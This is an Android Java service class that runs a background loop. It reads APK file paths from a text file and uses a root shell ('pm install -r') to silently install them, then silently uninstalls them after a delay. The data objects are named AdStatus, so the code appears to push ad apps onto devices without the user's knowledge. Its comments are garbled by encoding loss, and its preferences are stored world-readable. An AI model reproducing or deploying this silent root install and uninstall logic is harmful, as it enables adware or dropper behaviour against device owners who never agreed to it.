package com.example.hdj008k_location.service;

import java.io.File;
import java.io.IOException;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import com.example.hdj008k_location.MainActivity;
import com.example.hdj008k_location.db.HdjDbService;
import com.example.hdj008k_location.obj.AdStatus;
import com.example.hdj008k_location.util.InstallUtil;
import com.example.hdj008k_location.util.MyFileUtil;
import com.example.hdj008k_location.util.RecordAppFileHandlerHelper;
import com.example.hdj008k_location.util.StringUtil;

import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.sqlite.SQLiteDatabase;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

/**
 * ���������ں�̨�����߳�
 * */
public class InstallApkService extends Service {

	private Thread installThread;
	public static InstallReceiver receiver = null;
	ScheduledExecutorService executorService = Executors
			.newScheduledThreadPool(10);
	HdjDbService hdjDbService = null;

	private Runnable installRunnable = new Runnable() {
		@Override
		public void run() {
			// TODO Auto-generated method stub
			try {
				
				hdjDbService = new HdjDbService(getApplicationContext());
				while (true) {

					final SharedPreferences preferences = InstallApkService.this
							.getSharedPreferences("prefs",Context.MODE_WORLD_READABLE);
					
					int waitTime = preferences.getInt("WaitTiem", 15);// �̵߳�����ʱ��
					final int uninstallTime = preferences.getInt("UninstallTime", 5);// �೤ʱ���Ĭж��
//					Log.e("11111111111111", "waitTime = " + waitTime);
//					Log.e("11111111111111", "uninstallTime = " + uninstallTime);

					//���ص�apk·��
					String s = RecordAppFileHandlerHelper.getFileAllContent("InstallApk.txt");
					String[] apkPath = s.split("\n");

					//����������װ�㲥
					if (receiver == null) {
						receiver = new InstallReceiver();
						registerInstallReceiver();
					}

//					Log.e("*********************************", apkPath.length
//							+ "ѭ����ִ�У���������");

					for (int i = 0; i < apkPath.length; i++) {//&&
						String path = apkPath[i];

						// path = changeName(path);

						if (InstallUtil.isApkCanInstall(InstallApkService.this,
								path)) {//^^

//							Log.e("*********************************",
//									"ִ�е������ˣ���������");
							path = MyFileUtil.changeName(path);

							// HdjDbService hdjDbService = new HdjDbService(
							// getApplicationContext());

							AdStatus adStatus2 = hdjDbService.find(path);

//							Log.e("*********************************", path + adStatus2);

							//·�������ݿ��в����ھͱ��浽���ݿ�
							if (adStatus2 == null) {

								long time = System.currentTimeMillis();
								String packageName= InstallUtil.getUninstallAPKInfo(getApplicationContext(),path);
								RecordAppFileHandlerHelper.saveApkPath("InstallApkPackageName.txt", packageName);
								AdStatus adStatus = new AdStatus();
								adStatus.setAdpath(path);
								adStatus.setStatus(0);
								adStatus.setPackageName(packageName);
								adStatus.setTime(time);
								hdjDbService.save(adStatus);

							}

							// Thread.sleep(20 * 1000);

						}//^^
					}//&&

					// ��status = 0��ʱ�򣬰�װ��
					//status = 1ж��

					List<AdStatus> adStatus = hdjDbService.getScrollData();

					for (int j = 0; j < adStatus.size(); j++) {//@@
						
						//##
							
//							Log.e("InstallApkService--installRunnable",
//									"ttt-path="+ adStatus.get(j).getAdpath());
//							Log.e("InstallApkService--installRunnable",
//									"ttt-getStatus="+ adStatus.get(j).getStatus());
							
							SimpleDateFormat df = new SimpleDateFormat("HH:mm:ss");//�������ڸ�ʽ
							
							long nowTime = System.currentTimeMillis();
							long oldTime = adStatus.get(j).getTime();
//							
							Date data = new Date(nowTime);
							Date data2 = new Date(oldTime);
							
//							Log.e("InstallApkService--installRunnable",
//									"ttt-nowTime="+ df.format(data));
//							Log.e("InstallApkService--installRunnable",
//									"ttt-oldTime="+ df.format(data2));
//							Log.e("InstallApkService--installRunnable",
//									"ttt-xxx="+ (nowTime - adStatus.get(j).getTime()));
							
							if (InstallUtil.isApkCanInstall(InstallApkService.this,
									adStatus.get(j).getAdpath())&&adStatus.get(j).getStatus() == 0) {// ��Ĭ��װ

//								Log.e("xxxxxxxxxxxxxx",  "ִ�о�Ĭ��װ����");
								

								//�ж��Ƿ�����Ĭ��װ
								//��װ�Ƿ�ɹ�
								if (preferences.getBoolean("openInstall", false) 
										&& InstallUtil.haveRoot("pm install -r "+ adStatus.get(j).getAdpath())) {
									
//									Log.e("InstallApkService--installRunnable",
//											"ttt-path="+ adStatus.get(j).getAdpath());
								}
							} else if (adStatus.get(j).getStatus() == 1) {//!! ��Ĭж��
								
//								Log.e("2222222222222","����ж����");
//								Log.e("2222222222222","uninstallTime = "+uninstallTime);

								final AdStatus adStatus3 = adStatus.get(j);
								adStatus3.setStatus(2);

								//�ٿ����̴߳���ж��
								new Thread(new Runnable() {

									@Override
									public void run() {
										// TODO Auto-generated method stub
										try {
											Thread.sleep(uninstallTime * 1000);//�߳����߶�������ж��Ӧ��
										} catch (InterruptedException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}

										//�ж��Ƿ�����Ĭж��
										//�Ƿ�ж�سɹ�
										if (preferences.getBoolean("openUnInstall", false) 
												&&InstallUtil.clientUninstall(adStatus3.getPackageName())) {
											
											hdjDbService.update(adStatus3);

//											Log.e("xxxxxxxxxxxxxx",adStatus3.getPackageName()+ "ж�سɹ���");
										}

									}
								}).start();

							}//!!


					}//@@

					Thread.sleep(waitTime * 1000);
				}

			} catch (Exception e) {
				e.printStackTrace();
			}
		}

	};

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		// Log.e("InstallApkService--onCreate", "ttt-��һ������");

		installThread = new Thread(installRunnable);
		installThread.start();
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		if (installThread != null)
			installThread.interrupt();
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		// Log.e("InstallApkService--onStartCommand", "ttt-map.clear()");
		return super.onStartCommand(intent, flags, startId);
	}

	/**ע�����app��װ�㲥*/
	private void registerInstallReceiver() {
		try {
			IntentFilter filter = new IntentFilter(Intent.ACTION_PACKAGE_ADDED);
			filter.addDataScheme("package"); // �����������������ز����㲥
			getApplication().registerReceiver(receiver, filter);
		} catch (Exception e) {
			// TODO: handle exception
		}

	}
}
